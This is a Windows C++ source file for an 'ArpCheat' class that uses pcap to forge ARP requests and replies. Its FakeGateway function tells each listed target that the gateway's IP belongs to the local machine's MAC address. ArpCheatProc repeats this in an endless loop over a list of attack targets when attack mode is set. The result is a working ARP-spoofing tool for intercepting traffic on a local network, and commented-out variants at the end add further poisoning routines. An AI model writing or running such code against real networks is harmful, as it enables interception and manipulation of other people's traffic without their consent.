
#define WIN32_LEAN_AND_MEAN  // 减少不必要的头文件
#include <winsock2.h>
#include <windows.h>
#include "ArpCheat.h"
#include "ClientAddress.h"
#include "Packet.h"
#include "Public.h"



#define RARP_BROADCAST_TIMEDELAY 1000


int ArpCheat::BroadcastARP(pcap_t* pcapt, unsigned int ip) {
	int Result = 0;
	unsigned char	ArpPacket[256] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	memmove((char*)MACheader->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE);	// Broadcast MAC address
	memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);		// Local MAC address
	MACheader->Protocol = 0x0608;				// Ethernet type for ARP
	ARPheader->HardWareType = 0x0100;			// Ethernet
	ARPheader->ProtocolType = 0x0008;			// IPv4
	ARPheader->HardWareSize = MAC_ADDRESS_SIZE;	// MAC address size
	ARPheader->ProtocolSize = 4;				// IPv4 address size
	ARPheader->Opcode = 0x0100;					// ARP request
	memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);	// Local MAC address
	memmove(ARPheader->SenderIP, (unsigned char*)&(gLocalIP), sizeof(DWORD));	// Local IP address
	memmove((char*)ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE);	// Target MAC address (unknown)
	memmove(ARPheader->RecverIP, (unsigned char*)&(ip), sizeof(DWORD));			// Target IP address
	Result = pcap_sendpacket((pcap_t*)pcapt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER));
	if (Result)
	{
		printf("%s line:%d error\n", __FUNCTION__, __LINE__);
	}

	return Result;
}




int ArpCheat::EchoRARP(pcap_t* pcapt, unsigned int senederip, unsigned char* sendermac, 
	unsigned int recverip, unsigned char* recvermac)
{
	int Result = 0;
	unsigned char	ArpPacket[256] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	memmove((char*)MACheader->DstMAC, recvermac, MAC_ADDRESS_SIZE);
	memmove((char*)MACheader->SrcMAC, (char*)sendermac, MAC_ADDRESS_SIZE);
	MACheader->Protocol = 0x0608;
	ARPheader->HardWareType = 0x0100;
	ARPheader->ProtocolType = 0x0008;
	ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
	ARPheader->ProtocolSize = 4;
	ARPheader->Opcode = 0x0200;		// ARP reply
	memmove((char*)ARPheader->SenderMac, (char*)sendermac, MAC_ADDRESS_SIZE);
	memmove(ARPheader->SenderIP, (unsigned char*)&(senederip), sizeof(DWORD));
	memmove((char*)ARPheader->RecverMac, recvermac, MAC_ADDRESS_SIZE);
	memmove(ARPheader->RecverIP, (unsigned char*)&(recverip), sizeof(DWORD));
	Result = pcap_sendpacket((pcap_t*)pcapt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER));
	if (Result)
	{
		printf("%s line:%d error\n", __FUNCTION__, __LINE__);
	}

	return Result;
}



int ArpCheat::VirtualProxy(pcap_t * pcapt,unsigned int ip,unsigned char *mac) {
	int Result = 0;
	unsigned char	ArpPacket[256] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	memmove((char*)MACheader->DstMAC, mac, MAC_ADDRESS_SIZE);
	memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
	MACheader->Protocol = 0x0608;
	ARPheader->HardWareType = 0x0100;
	ARPheader->ProtocolType = 0x0008;
	ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
	ARPheader->ProtocolSize = 4;
	ARPheader->Opcode = 0x0200;
	memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
	memmove(ARPheader->SenderIP, (unsigned char *)&(gVirtualProxyIP), sizeof(DWORD));
	memmove((char*)ARPheader->RecverMac, mac, MAC_ADDRESS_SIZE);
	memmove(ARPheader->RecverIP, (unsigned char *)&(ip), sizeof(DWORD));
	Result = pcap_sendpacket((pcap_t*)pcapt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER));
	if (Result)
	{
		printf("%s line:%d error\n", __FUNCTION__, __LINE__);
	}

	return Result;
}


int ArpCheat::FakeGateway(pcap_t* pcapt, unsigned int ip, unsigned char* mac) {
	int iRet = 0;
	unsigned char	ArpPacket[256] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	memmove((char*)MACheader->DstMAC, mac, MAC_ADDRESS_SIZE);	// Target MAC address
	memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);	// Local MAC address
	MACheader->Protocol = 0x0608;	// Ethernet type for ARP
	ARPheader->HardWareType = 0x0100;	// Ethernet
	ARPheader->ProtocolType = 0x0008;	// IPv4
	ARPheader->HardWareSize = MAC_ADDRESS_SIZE;	// MAC address size
	ARPheader->ProtocolSize = 4;	// IPv4 address size
	ARPheader->Opcode = 0x0200;	// ARP reply
	memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);	// Local MAC address
	memmove(ARPheader->SenderIP, (unsigned char*)&(gGatewayIP), sizeof(DWORD));	// Gateway IP address
	memmove((char*)ARPheader->RecverMac,mac, MAC_ADDRESS_SIZE);	// Target MAC address
	memmove(ARPheader->RecverIP, (unsigned char*)&ip, sizeof(DWORD));// Target IP address
	iRet = pcap_sendpacket((pcap_t*)pcapt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER));
	if (iRet)
	{
		printf("%s line:%d error\n", __FUNCTION__, __LINE__);
	}
	return iRet;
}


int __stdcall ArpCheat::ArpCheatProc(pcap_t * pcap) {
	int iRet = 0;

	while (1)
	{
		int iRet = 0;

		iRet = VirtualProxy(pcap, gGatewayIP, gGatewayMAC);

		int cnt = gAttackTargetIP.size();
		for (int i = 0; i < cnt; i++)
		{
			if (gAttackTargetIP[i].clientIP == 0 || memcmp(gAttackTargetIP[i].clientMAC, "\x00\x00\x00\x00\x00\x00", 6) == 0)
			{
				continue;
			}
			if (gMode == ATTACK_MODE) {
				FakeGateway(pcap, gAttackTargetIP[i].clientIP, gAttackTargetIP[i].clientMAC);
			}
			iRet = VirtualProxy(pcap, gAttackTargetIP[i].clientIP, gAttackTargetIP[i].clientMAC);
		}

		Sleep(gArpDelay);
	}

	return TRUE;
}














/*
int ArpCheat::refreshGatewayArpList(pcap_t * pcapt, unsigned int ip, unsigned char mac[MAC_ADDRESS_SIZE]) {
int Result = 0;
unsigned char	ArpPacket[1024] = { 0 };
LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

memmove((char*)MACheader->DstMAC, gGatewayMAC, MAC_ADDRESS_SIZE);
memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
MACheader->Protocol = 0x0608;
ARPheader->HardWareType = 0x0100;
ARPheader->ProtocolType = 0x0008;
ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
ARPheader->ProtocolSize = 4;
ARPheader->Opcode = 0x0200;
memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
memmove(ARPheader->SenderIP, (unsigned char *)&(ip), sizeof(DWORD));
memmove((char*)ARPheader->RecverMac, gGatewayMAC, MAC_ADDRESS_SIZE);
memmove(ARPheader->RecverIP, (unsigned char *)&(gGatewayIP), sizeof(DWORD));
Result = pcap_sendpacket((pcap_t*)pcapt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER));
if (Result)
{
printf("ThreadArpCheat pcap_sendpacket error\n");
}

return Result;
}


int ArpCheat::sendRarp(pcap_t * pcapt,unsigned int ip,unsigned char mac[MAC_ADDRESS_SIZE]) {
int Result = 0;
unsigned char	ArpPacket[1024] = { 0 };
LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

memmove((char*)MACheader->DstMAC, mac, MAC_ADDRESS_SIZE);
memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
MACheader->Protocol = 0x0608;
ARPheader->HardWareType = 0x0100;
ARPheader->ProtocolType = 0x0008;
ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
ARPheader->ProtocolSize = 4;
ARPheader->Opcode = 0x0200;
memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
memmove(ARPheader->SenderIP, (unsigned char *)&(gGatewayIP), sizeof(DWORD));
memmove((char*)ARPheader->RecverMac, mac, MAC_ADDRESS_SIZE);
memmove(ARPheader->RecverIP, (unsigned char *)&(ip), sizeof(DWORD));
Result = pcap_sendpacket((pcap_t*)pcapt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER));
if (Result)
{
printf("ThreadArpCheat pcap_sendpacket error\n");
}

return Result;
}







int ArpCheat::adjustSelf(pcap_t * pcapt) {
int Result = 0;
unsigned char	ArpPacket[1024] = { 0 };
LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

memmove((char*)MACheader->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE);
memmove((char*)MACheader->SrcMAC, (char*)gGatewayMAC, MAC_ADDRESS_SIZE);
MACheader->Protocol = 0x0608;
ARPheader->HardWareType = 0x0100;
ARPheader->ProtocolType = 0x0008;
ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
ARPheader->ProtocolSize = 4;
ARPheader->Opcode = 0x0200;
memmove((char*)ARPheader->SenderMac, (char*)gGatewayMAC, MAC_ADDRESS_SIZE);
memmove(ARPheader->SenderIP, (unsigned char *)&(gGatewayIP), sizeof(DWORD));
memmove((char*)ARPheader->RecverMac, gLocalMAC, MAC_ADDRESS_SIZE);
memmove(ARPheader->RecverIP, (unsigned char *)&(gLocalIP), sizeof(DWORD));
Result = pcap_sendpacket((pcap_t*)pcapt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER));
if (Result)
{
printf("ThreadArpCheat pcap_sendpacket error\n");
}

return Result;
}
*/